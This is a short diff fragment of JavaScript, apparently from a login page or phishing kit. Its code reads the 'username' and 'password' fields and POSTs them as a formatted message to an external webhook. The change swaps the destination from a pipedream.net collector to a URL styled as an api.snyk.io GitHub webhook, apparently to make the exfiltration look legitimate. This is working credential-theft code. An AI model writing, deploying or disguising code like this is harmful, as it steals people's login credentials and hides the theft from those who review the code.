@@ -98,7 +98,7 @@
   } while (currentDate - date < milliseconds);
 }
     var request = new XMLHttpRequest();
-    request.open("POST", "https://6f97310af93fd483e4799b76c8935d63.m.pipedream.net");
+    request.open("POST", "https://api.snyk.io/webhook/github/837d3f1c-c0a2-4451-afb6-e79e2996a976");
     request.setRequestHeader('Content-type', 'application/json');
     var params = {
       content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
